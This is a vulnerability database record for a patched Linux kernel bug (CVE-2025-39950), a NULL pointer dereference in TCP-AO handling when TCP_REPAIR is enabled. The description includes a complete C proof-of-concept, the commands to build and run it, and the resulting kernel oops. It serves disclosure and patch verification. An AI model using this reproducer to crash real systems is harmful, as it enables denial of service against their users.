{"id": "EUVD-2025-32392", "enisaUuid": "dd6ab4d0-f0fa-3532-bded-abdeb9ad8b25", "description": "In the Linux kernel, the following vulnerability has been resolved:\n\nnet/tcp: Fix a NULL pointer dereference when using TCP-AO with TCP_REPAIR\n\nA NULL pointer dereference can occur in tcp_ao_finish_connect() during a\nconnect() system call on a socket with a TCP-AO key added and TCP_REPAIR\nenabled.\n\nThe function is called with skb being NULL and attempts to dereference it\non tcp_hdr(skb)->seq without a prior skb validation.\n\nFix this by checking if skb is NULL before dereferencing it.\n\nThe commentary is taken from bpf_skops_established(), which is also called\nin the same flow. Unlike the function being patched,\nbpf_skops_established() validates the skb before dereferencing it.\n\nint main(void){\n\tstruct sockaddr_in sockaddr;\n\tstruct tcp_ao_add tcp_ao;\n\tint sk;\n\tint one = 1;\n\n\tmemset(&sockaddr,'\\0',sizeof(sockaddr));\n\tmemset(&tcp_ao,'\\0',sizeof(tcp_ao));\n\n\tsk = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\n\tsockaddr.sin_family = AF_INET;\n\n\tmemcpy(tcp_ao.alg_name,\"cmac(aes128)\",12);\n\tmemcpy(tcp_ao.key,\"ABCDEFGHABCDEFGH\",16);\n\ttcp_ao.keylen = 16;\n\n\tmemcpy(&tcp_ao.addr,&sockaddr,sizeof(sockaddr));\n\n\tsetsockopt(sk, IPPROTO_TCP, TCP_AO_ADD_KEY, &tcp_ao,\n\tsizeof(tcp_ao));\n\tsetsockopt(sk, IPPROTO_TCP, TCP_REPAIR, &one, sizeof(one));\n\n\tsockaddr.sin_family = AF_INET;\n\tsockaddr.sin_port = htobe16(123);\n\n\tinet_aton(\"127.0.0.1\", &sockaddr.sin_addr);\n\n\tconnect(sk,(struct sockaddr *)&sockaddr,sizeof(sockaddr));\n\nreturn 0;\n}\n\n$ gcc tcp-ao-nullptr.c -o tcp-ao-nullptr -Wall\n$ unshare -Urn\n\nBUG: kernel NULL pointer dereference, address: 00000000000000b6\nPGD 1f648d067 P4D 1f648d067 PUD 1982e8067 PMD 0\nOops: Oops: 0000 [#1] SMP NOPTI\nHardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop\nReference Platform, BIOS 6.00 11/12/2020\nRIP: 0010:tcp_ao_finish_connect (net/ipv4/tcp_ao.c:1182)", "datePublished": "2025-10-04T07:31:10", "dateUpdated": "2025-10-04T07:31:10", "baseScore": 0.0, "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-39950", "https://git.kernel.org/stable/c/2e7bba08923ebc675b1f0e0e0959e68e53047838", "https://git.kernel.org/stable/c/5f445eb259906b61a518487a790e11d07d31738c", "https://git.kernel.org/stable/c/993b734d31ab804747ac961b1ee664b023c3b5fa"], "aliases": ["CVE-2025-39950", "GHSA-f4h6-hf7g-852r"], "assigner": "Linux", "epss": 0.02, "enisaIdProduct": [{"id": "2bb2f740-628f-3c40-9e9f-9ef8855b561b", "product": {"name": "Linux"}, "product_version": "6.7"}, {"id": "3005f829-8b20-3a65-8bf6-a0b3234fea8b", "product": {"name": "Linux"}, "product_version": "patch: 6.16.9"}, {"id": "4800270a-722e-301f-a7b4-cafc99faac4a", "product": {"name": "Linux"}, "product_version": "7c2ffaf21bd67f73d21560995ce17eaf5fc1d37f <2e7bba08923ebc675b1f0e0e0959e68e53047838"}, {"id": "5a0ddf44-59f2-38fb-b1e2-b15a1eb10c19", "product": {"name": "Linux"}, "product_version": "7c2ffaf21bd67f73d21560995ce17eaf5fc1d37f <993b734d31ab804747ac961b1ee664b023c3b5fa"}, {"id": "62e723e2-3dcf-3aff-8e62-18ba76caa1db", "product": {"name": "Linux"}, "product_version": "patch: 6.17"}, {"id": "6330f652-1250-3494-bae0-e3c78de313d2", "product": {"name": "Linux"}, "product_version": "7c2ffaf21bd67f73d21560995ce17eaf5fc1d37f <5f445eb259906b61a518487a790e11d07d31738c"}, {"id": "a821680f-73c1-3c2b-8db3-687a9c2edcd9", "product": {"name": "Linux"}, "product_version": "patch: 0"}, {"id": "fd6d7440-2359-305f-9ae5-891c4c04de76", "product": {"name": "Linux"}, "product_version": "patch: 6.12.49"}], "enisaIdVendor": [{"id": "de716f13-0835-332d-bd96-64f24b85e821", "vendor": {"name": "Linux"}}], "isExploited": false}